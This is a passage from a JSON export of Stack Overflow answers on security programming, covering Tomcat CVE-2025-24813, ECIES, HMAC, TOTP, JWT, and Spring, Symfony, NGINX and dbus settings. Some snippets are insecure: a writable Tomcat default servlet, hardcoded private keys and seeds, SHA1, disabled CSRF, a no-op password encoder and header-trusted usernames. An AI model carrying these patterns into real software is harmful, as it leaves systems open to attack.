        "body": "Imports System.DirectoryServices.AccountManagement\nPublic Shared Function IsMemberOfGroup(userName As String, machineName As String, memberGroup as String) As Boolean\n    Dim isMember As Boolean = False\n    Using rootContext As New PrincipalContext(ContextType.Machine, machineName), _\n          grp As GroupPrincipal = GroupPrincipal.FindByIdentity(rootContext, memberGroup), _\n          usr As UserPrincipal = UserPrincipal.FindByIdentity(rootContext, IdentityType.SamAccountName, userName)\n        If grp IsNot Nothing AndAlso usr IsNot Nothing Then\n            ' Check if the user is a member of the group.\n            isMember = grp.GetMembers(True).Contains(usr)\n        Else\n            isMember = False\n        End If\n    End Using\n    Return isMember\nEnd Function",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2013-02-26T15:17:25",
        "author": "KyleMit"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79517178/detect-if-cve-2025-24813-applies-to-spring-boot",
    "title": "Detect if CVE-2025-24813 applies to spring boot",
    "question_id": 79517178,
    "posted_date": "2025-03-18T07:05:43",
    "answers": [
      {
        "answer_id": 79519613,
        "body": "@Bean\n    public WebServerFactoryCustomizer<TomcatServletWebServerFactory> customizer() {\n        return factory -> factory.addContextCustomizers(context -> {\n            ServletContext servletContext = context.getServletContext();\n            Map<String, ? extends ServletRegistration> servletRegistrations = servletContext.getServletRegistrations();\n            ServletRegistration.Dynamic defaultServletRegistration = (ServletRegistration.Dynamic) servletRegistrations.get(\"default\");\n            if (defaultServletRegistration != null) {\n                defaultServletRegistration.setInitParameter(\"readonly\", \"false\");\n            }\n        });\n    }",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2025-03-19T04:48:08",
        "author": "gulpener"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78321888/is-this-a-valid-use-case-for-eval-or-how-could-i-avoid-security-risks",
    "title": "Is this a valid use case for eval or how could I avoid security risks?",
    "question_id": 78321888,
    "posted_date": "2024-04-13T16:06:27",
    "answers": [
      {
        "answer_id": 78321922,
        "body": "def call_fun(cmd):\n    match cmd:\n        case [\"print\"]:\n            print(o_list)\n        case [\"sort\"]:\n            o_list.sort()\n        case [\"pop\"]:\n            o_list.pop()\n        case [\"reverse\"]:\n            o_list.reverse()\n        case [\"remove\", value]:\n            o_list.remove(int(value))\n        case [\"append\", value]:\n            o_list.append(int(value))\n        case [\"insert\", index, value]:\n            o_list.insert(int(index), int(value))\n        case _:\n            raise ValueError(\"invalid command\")",
        "score": 5,
        "is_accepted": false,
        "creation_date": "2024-04-13T16:20:51",
        "author": "Ry-"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/75539733/flutter-ecies-encrypt-decrypt",
    "title": "Flutter: ECIES Encrypt/Decrypt",
    "question_id": 75539733,
    "posted_date": "2023-02-22T20:19:42",
    "answers": [
      {
        "answer_id": 75571004,
        "body": "import 'dart:math';\nimport 'dart:convert';\nimport 'dart:typed_data';\nimport 'package:convert/convert.dart';\nimport 'package:pointycastle/export.dart';\n...\nvar rnd = getSecureRandom();\nvar domainParams = ECDomainParameters(\"secp256k1\");\nString encrypt(var rawPubKeyCompUncomp, var plaintext){\n  // 1. Create ephemeral key pair\n  var ephKeyPair = (KeyGenerator(\"EC\")..init(ParametersWithRandom(ECKeyGeneratorParameters(domainParams), rnd))).generateKeyPair();\n  // 2. Import public key of receiver\n  var ecPoint = domainParams.curve.decodePoint(hex.decode(rawPubKeyCompUncomp));\n  var publicKey = ECPublicKey(ecPoint, domainParams);\n  // 3. Get full point to ECDH shared secret, derive AES key via HKDF\n  var sharedSecretECPointUncomp = (publicKey.Q! * (ephKeyPair.privateKey as ECPrivateKey).d)!.getEncoded(false);\n  var ephPublicKeyUncomp = (ephKeyPair.publicKey as ECPublicKey).Q!.getEncoded(false);\n  var aesKey = hkdf(ephPublicKeyUncomp, sharedSecretECPointUncomp);\n  // 4. Encrypt via AES-256, GCM\n  var nonce = rnd.nextBytes(16);\n  var ciphertextTag = (GCMBlockCipher(AESEngine())..init(true, AEADParameters(KeyParameter(aesKey), 128, nonce, Uint8List(0)))).process(plaintext);\n  // 5. Concatenate (ephemeral public key|nonce|tag|ciphertext), Base64 encode and return\n  return base64.encode(ephPublicKeyUncomp + nonce + ciphertextTag.sublist(ciphertextTag.length - 16) + ciphertextTag.sublist(0, ciphertextTag.length - 16));\n}\nSecureRandom getSecureRandom() {\n  List<int> seed = List<int>.generate(32, (_) => Random.secure().nextInt(256));\n  return FortunaRandom()..seed(KeyParameter(Uint8List.fromList(seed)));\n}\nUint8List hkdf(var ephPublicKeyUnc, var sharedSecretEcPointUnc) {\n  var master = Uint8List.fromList(ephPublicKeyUnc + sharedSecretEcPointUnc);\n  var aesKey = Uint8List(32);\n  (HKDFKeyDerivator(SHA256Digest())..init(HkdfParameters(master, 32, null))).deriveKey(null, 0, aesKey, 0);\n  return aesKey;\n}",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2023-02-26T04:14:04",
        "author": "user21105343"
      },
      {
        "answer_id": 75571004,
        "body": "String decrypt(var rawPrivKeyHex, var encryptedDataB64){\n  // 1. Import private key\n  var privateKey = ECPrivateKey(BigInt.parse(rawPrivKeyHex, radix: 16), domainParams);\n  // 2. Separate ephemeral public key and nonce|tag|ciphertext, import ephemeral public key\n  var encryptedData = base64.decode(encryptedDataB64);\n  var ephPublicKey = ECPublicKey(domainParams.curve.decodePoint(encryptedData.sublist(0, 65)), domainParams);\n  var nonceTagCiphertext = encryptedData.sublist(65);\n  // 3. Get full point to ECDH shared secret, derive AES key via HKDF\n  var sharedSecretECPointUncomp = (ephPublicKey.Q! * privateKey.d)!.getEncoded(false);\n  var ephPublicKeyUncomp = ephPublicKey.Q!.getEncoded(false);\n  var aesKey = hkdf(ephPublicKeyUncomp, sharedSecretECPointUncomp);\n  // 4. Decrypt via AES-256, GCM\n  var nonce = nonceTagCiphertext.sublist(0, 16);\n  var ciphertextTag = nonceTagCiphertext.sublist(16 + 16) + nonceTagCiphertext.sublist(16, 16 + 16);\n  var plaintext = (GCMBlockCipher(AESEngine())..init(false, AEADParameters(KeyParameter(aesKey), 128, nonce, Uint8List(0)))).process(Uint8List.fromList(ciphertextTag));\n  // 5. UTF-8 decode and return\n  return utf8.decode(plaintext);\n}",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2023-02-26T04:14:04",
        "author": "user21105343"
      },
      {
        "answer_id": 75571004,
        "body": "var rawPubKeyHex = \"0237a43daabbd2c22afecc17ee7091045d55c0d886821bf0104b123f4fdeec2279\";\nvar rawPrivKeyHex = \"09e91db31e3b56037d95e8d1ba2b4778c7c90ce818ab40185a6a6b54514f8c5f\";\nvar plaintext = utf8.encode(\"Es genial trabajar con ordenadores. No discuten, lo recuerdan todo y no se beben tu cerveza. -Paul Leary\");\nvar encryptedDataB64 = encrypt(rawPubKeyHex, plaintext);\nprint(encryptedDataB64);\nvar decryptedText = decrypt(rawPrivKeyHex, encryptedDataB64);\nprint(decryptedText); // Es genial trabajar con ordenadores. No discuten, lo recuerdan todo y no se beben tu cerveza. -Paul Leary",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2023-02-26T04:14:04",
        "author": "user21105343"
      },
      {
        "answer_id": 75571004,
        "body": "var rawPrivKeyHex = \"09e91db31e3b56037d95e8d1ba2b4778c7c90ce818ab40185a6a6b54514f8c5f\";\nvar encryptedDataB64 = \"BD2NPMycdxfE2hJB5jyG6ozs7MHOA0hQrsrEeq5hnLs9PkZmNQE46BAzrO2dUZ0ecKsT2rB6PZo6jzIEU2b0kimhyV29eE6y0E4hVbdq14RwVXjnAhSODN8ZC5RBxsjp31ivqH0zAKHMpfHRiPkBBPgVr1gPurSvkkNMknXUtYtPBxbQc9IHpIlZe8YQWX105obraACxDOoCHV2I1kWUiuxlABI1knO0pD1e9mNwmdgkq5YhJApVKKVX4WUcGrfVHNnvdRTkBXCf\";\nvar decryptedText = decrypt(rawPrivKeyHex, encryptedDataB64);\nprint(decryptedText); // Es genial trabajar con ordenadores. No discuten, lo recuerdan todo y no se beben tu cerveza. -Paul Leary",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2023-02-26T04:14:04",
        "author": "user21105343"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/74366540/symfony-5-4-expected-scalar-but-got-array-in-security-yml",
    "title": "Symfony 5.4 - Expected &quot;scalar&quot;, but got &quot;array&quot; in security.yml",
    "question_id": 74366540,
    "posted_date": "2022-11-08T15:05:04",
    "answers": [
      {
        "answer_id": 74366692,
        "body": "security:\n    enable_authenticator_manager: true\n    password_hashers:\n        Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface:\n            algorithm: auto\n            cost: 4\n            time_cost: 3\n            memory_cost: 10\n    providers:\n        # users_in_memory: { memory: null }\n        app_user_provider:\n            entity:\n                class: App\\Entity\\User\n                property: email\n    firewalls:\n        dev:\n            pattern: ^/(_(profiler|wdt)|css|images|js)/\n            security: false\n        main:\n            lazy: true\n            provider:\n                app_user_provider\n    ...",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2022-11-08T15:18:46",
        "author": "craigh"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64279365/add-security-headers-in-nginx-while-using-fastcgi-caching",
    "title": "add security headers in NGINX while using fastcgi caching",
    "question_id": 64279365,
    "posted_date": "2020-10-09T07:41:18",
    "answers": [
      {
        "answer_id": 64280522,
        "body": "fastcgi_no_cache $skip_cache;\n        fastcgi_cache phpcache;\n        fastcgi_cache_valid 200 1m;\n        fastcgi_cache_valid 301 1m;\n        fastcgi_cache_valid 302 1m;\n        fastcgi_cache_valid 307 1m;\n        fastcgi_cache_valid 404 1m;\n        fastcgi_cache_use_stale error timeout invalid_header http_500 http_503;\n        fastcgi_cache_min_uses 1;\n        fastcgi_cache_methods GET HEAD;\n        fastcgi_ignore_headers Cache-Control Expires Set-Cookie;\n        add_header X-FastCGI-Cache $upstream_cache_status;\n        add_header Referrer-Policy 'origin';\n        add_header \"X-Frame-Options: sameorigin\" always;",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2020-10-09T08:55:21",
        "author": "Danila Vershinin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63954594/security-problemis-there-any-way-to-hide-dbus-method-call-from-monitoring-dbus",
    "title": "(Security Problem)Is there any way to hide dbus method call from monitoring dbus?",
    "question_id": 63954594,
    "posted_date": "2020-09-18T07:07:29",
    "answers": [
      {
        "answer_id": 63967899,
        "body": "dbus-monitor  --system interface=fi.w1.wpa_supplicant1.Network\ndbus-monitor: unable to enable new-style monitoring: org.freedesktop.DBus.Error.AccessDenied: \"Rejected send message, 1 matched rules; type=\"method_call\", sender=\":1.6957\" (uid=1002 pid=206438 comm=\"dbus-monitor --system interface=fi.w1.wpa_supplica\") interface=\"org.freedesktop.DBus.Monitoring\" member=\"BecomeMonitor\" error name=\"(unset)\" requested_reply=\"0\" destination=\"org.freedesktop.DBus\" (bus)\". Falling back to eavesdropping.\nsignal time=1600511999.087722 sender=org.freedesktop.DBus -> destination=:1.6957 serial=2 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=NameAcquired\n   string \":1.6957\"",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2020-09-19T06:50:16",
        "author": "J&#252;rgen H&#246;tzel"
      },
      {
        "answer_id": 63967899,
        "body": "<!DOCTYPE busconfig PUBLIC\n \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\"\n \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\">\n<busconfig>\n        <policy user=\"root\">\n                <allow own=\"fi.w1.wpa_supplicant1\"/>\n                <allow send_destination=\"fi.w1.wpa_supplicant1\"/>\n                <allow send_interface=\"fi.w1.wpa_supplicant1\"/>\n                <allow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/>\n        </policy>\n        <policy context=\"default\">\n                <deny own=\"fi.w1.wpa_supplicant1\"/>\n                <deny send_destination=\"fi.w1.wpa_supplicant1\"/>\n                <deny receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/>\n        </policy>\n</busconfig>",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2020-09-19T06:50:16",
        "author": "J&#252;rgen H&#246;tzel"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63443511/how-to-secure-a-backend-mobile-rest-api-to-communicate-only-with-my-application",
    "title": "How to Secure a backend mobile REST API to communicate only with my application?",
    "question_id": 63443511,
    "posted_date": "2020-08-16T21:32:44",
    "answers": [
      {
        "answer_id": 63490458,
        "body": "private fun calculateAPIRequestHMAC(url: URL, authHeaderValue: String): String {\n        val secret = JniEnv().getHmacSecret()\n        var keySpec: SecretKeySpec\n        // Configure the request HMAC based on the demo stage\n        when (currentDemoStage) {\n            DemoStage.API_KEY_PROTECTION, DemoStage.APPROOV_APP_AUTH_PROTECTION -> {\n                throw IllegalStateException(\"calculateAPIRequestHMAC() not used in this demo stage\")\n            }\n            DemoStage.HMAC_STATIC_SECRET_PROTECTION -> {\n                // Just use the static secret to initialise the key spec for this demo stage\n                keySpec = SecretKeySpec(Base64.decode(secret, Base64.DEFAULT), \"HmacSHA256\")\n                Log.i(TAG, \"CALCULATE STATIC HMAC\")\n            }\n            DemoStage.HMAC_DYNAMIC_SECRET_PROTECTION -> {\n                Log.i(TAG, \"CALCULATE DYNAMIC HMAC\")\n                // Obfuscate the static secret to produce a dynamic secret to initialise the key\n                // spec for this demo stage\n                val obfuscatedSecretData = Base64.decode(secret, Base64.DEFAULT)\n                val shipFastAPIKeyData = loadShipFastAPIKey().toByteArray(Charsets.UTF_8)\n                for (i in 0 until minOf(obfuscatedSecretData.size, shipFastAPIKeyData.size)) {\n                    obfuscatedSecretData[i] = (obfuscatedSecretData[i].toInt() xor shipFastAPIKeyData[i].toInt()).toByte()\n                }\n                val obfuscatedSecret = Base64.encode(obfuscatedSecretData, Base64.DEFAULT)\n                keySpec = SecretKeySpec(Base64.decode(obfuscatedSecret, Base64.DEFAULT), \"HmacSHA256\")\n            }\n        }\n        //Log.i(TAG, \"protocol: ${url.protocol}\")\n        //Log.i(TAG, \"host: ${url.host}\")\n        //Log.i(TAG, \"path: ${url.path}\")\n        //Log.i(TAG, \"Authentication: $authHeaderValue\")\n        // Compute the request HMAC using the HMAC SHA-256 algorithm\n        val hmac = Mac.getInstance(\"HmacSHA256\")\n        hmac.init(keySpec)\n        hmac.update(url.protocol.toByteArray(Charsets.UTF_8))\n        hmac.update(url.host.toByteArray(Charsets.UTF_8))\n        hmac.update(url.path.toByteArray(Charsets.UTF_8))\n        hmac.update(authHeaderValue.toByteArray(Charsets.UTF_8))\n        return hmac.doFinal().toHex()\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2020-08-19T11:35:07",
        "author": "Exadra37"
      },
      {
        "answer_id": 63490458,
        "body": "router.use(function(req, res, next) {\n  log.info('---> VALIDATING DYNAMIC HMAC <---')\n  let base64_decoded_hmac_secret = Buffer.from(config.SHIPFAST_API_HMAC_SECRET, 'base64')\n  // Obfuscate the static secret to produce a dynamic secret to use during HMAC\n  // verification for this demo stage\n  let obfuscatedSecretData = base64_decoded_hmac_secret\n  let shipFastAPIKeyData = new Buffer(config.SHIPFAST_API_KEY)\n  for (let i = 0; i < Math.min(obfuscatedSecretData.length, shipFastAPIKeyData.length); i++) {\n    obfuscatedSecretData[i] ^= shipFastAPIKeyData[i]\n  }\n  let obfuscatedSecret = new Buffer(obfuscatedSecretData).toString('base64')\n  hmac = crypto.createHmac('sha256', Buffer.from(obfuscatedSecret, 'base64'))\n  if (hmacHelpers.isValidHmac(hmac, config, req)) {\n    next()\n    return\n  }\n  res.status(400).send()\n  return\n})",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2020-08-19T11:35:07",
        "author": "Exadra37"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78824704/secure-random-seed-not-working-in-mainactivity",
    "title": "Secure Random Seed Not Working In MainActivity",
    "question_id": 78824704,
    "posted_date": "2024-08-02T05:22:49",
    "answers": [
      {
        "answer_id": 78825299,
        "body": "import org.bouncycastle.crypto.ec.CustomNamedCurves\nimport org.bouncycastle.crypto.params.ECDomainParameters\nimport org.bouncycastle.crypto.params.ECPrivateKeyParameters\nimport org.bouncycastle.crypto.params.ECPublicKeyParameters\nimport org.bouncycastle.math.ec.FixedPointCombMultiplier\nimport java.math.BigInteger\nimport java.security.InvalidAlgorithmParameterException\nimport java.security.NoSuchAlgorithmException\nimport javax.crypto.SecretKeyFactory\nimport javax.crypto.spec.PBEKeySpec\nclass GenerateTerminalEphemeralPublicPrivateKeys {\n    @OptIn(ExperimentalStdlibApi::class)\n    @Throws(NoSuchAlgorithmException::class, InvalidAlgorithmParameterException::class)\n    fun generate(): String {\n        // Derive key from a fixed seed using PBKDF2\n        val seed = \"test-seed\"\n        val salt = ByteArray(16) { 0 } // fixed salt for deterministic output\n        val iterations = 10000\n        val keyLength = 256\n        val keySpec = PBEKeySpec(seed.toCharArray(), salt, iterations, keyLength)\n        val secretKeyFactory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\")\n        val derivedKey = secretKeyFactory.generateSecret(keySpec).encoded\n        // Convert derived key to BigInteger\n        val privateKeyD = BigInteger(1, derivedKey.sliceArray(0 until 32))\n        // Use the derived private key to generate the public key\n        val x9 = CustomNamedCurves.getByName(\"secp256r1\")\n        val curve = x9.curve\n        val domainParams = ECDomainParameters(curve, x9.g, x9.n, x9.h)\n        val privateKeyParams = ECPrivateKeyParameters(privateKeyD, domainParams)\n        val publicKeyParams = ECPublicKeyParameters(\n            FixedPointCombMultiplier().multiply(domainParams.g, privateKeyD),\n            domainParams\n        )\n        val publicKeyByteArray = publicKeyParams.q.getEncoded(true)\n        return publicKeyByteArray.toHexString()\n    }\n    private fun ByteArray.toHexString(): String {\n        return joinToString(\"\") { \"%02x\".format(it) }\n    }\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2024-08-02T07:40:14",
        "author": "Tom Rowbotham"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78076339/implementation-of-totp-on-rust",
    "title": "Implementation of TOTP on Rust",
    "question_id": 78076339,
    "posted_date": "2024-02-28T12:02:28",
    "answers": [
      {
        "answer_id": 78077993,
        "body": "use hmac::Mac;\nuse sha1::Sha1;\nfn totp(key: &str, time: u64, size: u32, x: u16) -> u64 {\n    let key = base32::decode(base32::Alphabet::RFC4648 { padding: false }, key).unwrap();\n    let t = time / (x as u64);\n    let timebuf = t.to_be_bytes();\n    let mut h = hmac::Hmac::<Sha1>::new_from_slice(&key).unwrap();\n    h.update(&timebuf);\n    let hmac_vec = h.finalize().into_bytes();\n    let offset: u8 = hmac_vec[19] & 0xf;\n    let hmac_truncated: Vec<u8> = hmac_vec[(offset as usize)..=((offset + 3) as usize)].to_vec();\n    let code_num = u32::from_be_bytes(hmac_truncated.try_into().unwrap()) & 0x7fffffff;\n    (code_num as u64) % 10_u64.pow(size)\n}\nfn main() {\n    let res = totp(\"JBSWY3DPEHPK3PXP\", 1000000, 6, 30);\n    dbg!(res);\n}\n#[cfg(test)]\nmod tests {\n    use super::totp;\n    #[test]\n    fn known_values() {\n        assert_eq!(\n            totp(\"GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ\", 59, 8, 30),\n            94287082\n        );\n        assert_eq!(\n            totp(\"GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ\", 1111111109, 8, 30),\n            07081804\n        );\n    }\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2024-02-28T17:38:42",
        "author": "bk2204"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77947796/spring-cors-error-access-control-allow-credentials-header-in-the-response-is",
    "title": "Spring CORS error: &#39;Access-Control-Allow-Credentials&#39; header in the response is &#39;&#39; which must be &#39;true&#39; when request&#39;s credentials mode is &#39;include&#39;",
    "question_id": 77947796,
    "posted_date": "2024-02-06T07:44:27",
    "answers": [
      {
        "answer_id": 77947818,
        "body": "@Configuration\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http.cors().and()......\n\t}\n@Bean\n    CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n\n       configuration.setAllowedOrigins(Arrays.asList(allowedOrigins));\n       configuration.setAllowedHeaders(Arrays.asList(\"*\"));\n       configuration.setAllowedMethods(Arrays.asList(\"*\"));\n        configuration.setAllowCredentials(true);\n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", configuration);\n        return source;\n    }",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2024-02-06T07:48:07",
        "author": "akarahman"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76239681/generate-short-lifetime-jwt-token-with-lexikjwtauthenticationbundle",
    "title": "Generate short lifetime JWT token with LexikJWTAuthenticationBundle",
    "question_id": 76239681,
    "posted_date": "2023-05-12T16:16:41",
    "answers": [
      {
        "answer_id": 76257528,
        "body": "// EventListener/JWTCreatedListener.php\ndeclare(strict_types=1);\nnamespace App\\EventListener;\nuse App\\Controller\\Authentication\\GetDocumentFileToken;\nuse Lexik\\Bundle\\JWTAuthenticationBundle\\Event\\JWTCreatedEvent;\n/**\n * Class JWTCreatedListener\n */\nclass JWTCreatedListener\n{\n    /**\n     * @param JWTCreatedEvent $event\n     *\n     * @return void\n     */\n    public function onJWTCreated(JWTCreatedEvent $event): void\n    {\n        $payload = $event->getData();\n        if (($payload['scope'] ?? '') === 'fileScope') {\n            $expiration = new \\DateTime('+1 minute');\n            $payload['exp'] = $expiration->getTimestamp();\n        }\n        $event->setData($payload);\n    }\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2023-05-15T15:50:22",
        "author": "NickHatBoecker"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/71515480/java-adding-binarysecuritytoken-right-after-wsutimestamp-element",
    "title": "Java - Adding BinarySecurityToken right after wsu:Timestamp element",
    "question_id": 71515480,
    "posted_date": "2022-03-17T12:00:34",
    "answers": [
      {
        "answer_id": 71559928,
        "body": "private Document signWsSec(Document doc) throws WSSecurityException {\n        X509Certificate[] issuerCerts = getCrypto().getX509Certificates(null);\n\n        WSSecHeader secHeader = new WSSecHeader(doc);\n        secHeader.insertSecurityHeader();\n\n        WSSecTimestamp timestamp = new WSSecTimestamp(secHeader);\n        timestamp.setTimeToLive(300);\n        timestamp.build();\n\n        WSSecSignature sign = new WSSecSignature(secHeader);\n        sign.setX509Certificate(issuerCerts[0]);\n        sign.setUseSingleCertificate(true);\n\n        org.apache.xml.security.Init.init();\n        sign.setKeyIdentifierType(WSConstants.BST_DIRECT_REFERENCE);\n        sign.setSignatureAlgorithm(XMLSignature.ALGO_ID_SIGNATURE_RSA_SHA1);\n        sign.setAddInclusivePrefixes(false);\n        sign.setDigestAlgo(DigestMethod.SHA1);\n\n        timestamp.prependToHeader();\n        return build(crypto, sign, doc);\n    }\n    public Document build(Crypto cr, WSSecSignature sign, Document doc)\n            throws WSSecurityException {\n        sign.prepare(cr);\n        if (sign.getParts().isEmpty()) {\n            WSEncryptionPart timestampPart = new WSEncryptionPart(\"Timestamp\", WSConstants.WSU_NS, \"\");\n            sign.getParts().add(timestampPart);\n            sign.getParts().add(WSSecurityUtil.getDefaultEncryptionPart(doc));\n        }\n        List<javax.xml.crypto.dsig.Reference> referenceList = sign.addReferencesToSign(sign.getParts());\n        sign.computeSignature(referenceList);\n        sign.appendBSTElementToHeader();\n        return doc;\n    }",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2022-03-21T11:17:01",
        "author": "Pasq"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64539442/controller-securitycontrollerloginaction-requires-that-you-provide-a-value",
    "title": "Controller &quot;SecurityController::loginAction()&quot; requires that you provide a value for the &quot;$authenticationUtils&quot; argument",
    "question_id": 64539442,
    "posted_date": "2020-10-26T10:49:04",
    "answers": [
      {
        "answer_id": 64550235,
        "body": "class SecurityController extends Controller\n {\n     private $authenticationUtils;\n     public function __construct(AuthenticationUtils $authenticationUtils) {\n         $this->authenticationUtils = $authenticationUtils;\n     }\n     public function loginAction()\n     {\n         // get the login error if there is one\n         $error = $this-authenticationUtils->getLastAuthenticationError();\n         // last username entered by the user\n         $lastUsername = $this-authenticationUtils->getLastUsername();\n         return $this->render('security/login.html.twig', [\n             'last_username' => $lastUsername,\n             'error'         => $error,\n         ]);\n     }\n }",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2020-10-27T04:00:43",
        "author": "Nico Haase"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63756575/jwt-refresh-token-can-it-be-self-contained",
    "title": "JWT refresh token. Can it be self contained?",
    "question_id": 63756575,
    "posted_date": "2020-09-05T13:15:16",
    "answers": [
      {
        "answer_id": 63757029,
        "body": "{\n  \"iss\": \"ABC Service\", (The Issuer of the token)\n  \"sub\": \"4953fag3-ec5e-4ed3-b09e-d847f3f376c6\", (The user_id, subject of the token)\n  \"aud\": \"UI\", (audience who will use the token)\n  \"typ\": \"access\", (type)\n  \"iat\": 1599326501,\n  \"exp\": 1599412901,\n  \"jti\": \"3d2985ef-e767-495e-af88-448fc0ecb167\", (unique identifier for this token)\n  \"mid\": \"e392692b-6d77-49a9-9928-ac3c3d5208a3\", (unique identifier for access-refresh token pair - refers to map_id in login_sessions table)\n}\n  \"fname\": \"john\",\n  \"lname\": \"doe\",\n  \"roles\": [99b18377-5b4c-4e68-8ff4-bac4aea93bd2]\n  \"other_key\": \"other_value\"",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2020-09-05T14:05:57",
        "author": "Manish Juriani"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62988419/how-do-i-create-request-header-authentication-siteminder-java-config-class",
    "title": "How do I create Request-Header Authentication (Siteminder) java config class",
    "question_id": 62988419,
    "posted_date": "2020-07-19T23:53:27",
    "answers": [
      {
        "answer_id": 63036826,
        "body": "@EnableWebSecurity\n@Configuration\n@Order(SecurityProperties.BASIC_AUTH_ORDER - 10)\npublic class SecurityConfigurer extends WebSecurityConfigurerAdapter {\n    @Autowired\n    private MyUserDetailsService userDetailsService;\n    @Override\n    protected void configure(AuthenticationManagerBuilder auth) throws Exception {\n        auth.userDetailsService(userDetailsService);\n        auth.authenticationProvider(preAuthenticatedAuthenticationProvider());\n    }\n    @Bean\n    public RequestHeaderAuthenticationFilter siteminderFilter() throws Exception {\n        RequestHeaderAuthenticationFilter filter = new RequestHeaderAuthenticationFilter();\n        filter.setPrincipalRequestHeader(\"SM_USER\");\n        filter.setAuthenticationManager(this.authenticationManager());\n        return filter;\n    }\n    @Bean\n    public PreAuthenticatedAuthenticationProvider preAuthenticatedAuthenticationProvider() {\n        PreAuthenticatedAuthenticationProvider preauthAuthProvider = new PreAuthenticatedAuthenticationProvider();\n        preauthAuthProvider.setPreAuthenticatedUserDetailsService(userDetailsByNameServiceWrapper());\n        return preauthAuthProvider;\n    }\n    @Bean\n    public UserDetailsByNameServiceWrapper userDetailsByNameServiceWrapper() {\n        UserDetailsByNameServiceWrapper userDetailsServiceWrapper = new UserDetailsByNameServiceWrapper();\n        userDetailsServiceWrapper.setUserDetailsService(userDetailsService);\n        return userDetailsServiceWrapper;\n    }\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http\n                .addFilter(siteminderFilter())\n                .csrf().disable()// Disable for GraphIQL to work locally\n                .antMatcher(\"/**\")\n                .authorizeRequests()\n                .antMatchers(\"/healthcheck/**\").permitAll()\n                .antMatchers(\"/approvers/**\").hasRole(\"APPROVER\")\n                .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                .anyRequest().authenticated()\n                .and().httpBasic();\n    }\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2020-07-22T10:38:47",
        "author": "Bikram Das"
      },
      {
        "answer_id": 63036826,
        "body": "@Service\npublic class MyUserDetailsService implements UserDetailsService {\n    private Logger logger = LoggerFactory.getLogger(SCPMUserDetailsService.class);\n    @Autowired\n    private HttpServletRequest request;\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException{\n        HttpServletRequest request  =\n                ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes())\n                        .getRequest();\n        String csgroups = \"\";\n        Collection<GrantedAuthority> auth = new ArrayList<>();\n        try {\n            username = request.getHeader(\"SM_USER\");\n        } catch (Exception ex){\n            logger.trace(\"SM_USER not found in Request Http Headers\");\n            ex.printStackTrace();\n        }\n        try {\n            csgroups = request.getHeader(\"ROLES\");;\n        } catch (Exception ex){\n            logger.trace(\"CSGROUPS not found in Request Http Headers\");\n            ex.printStackTrace();\n        }\n        //Roles\n        if(csgroups != null) {\n            StringTokenizer st = new StringTokenizer(csgroups, \"^\");\n            while (st.hasMoreElements()) {\n                GrantedAuthority authority = new SimpleGrantedAuthority(\"ROLE_\" + st.nextToken());\n            }\n        }\n        return new User(username, \"\", true, true, true, true,auth);\n    }\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return NoOpPasswordEncoder.getInstance();\n    }\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2020-07-22T10:38:47",
        "author": "Bikram Das"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62913354/is-sha256-considered-insecure-sonarqube-quality-gate-how-can-i-fix-it",
    "title": "Is SHA256 considered insecure?- SonarQube Quality Gate - How can I fix it?",
    "question_id": 62913354,
    "posted_date": "2020-07-15T06:57:54",
    "answers": [
      {
        "answer_id": 62992332,
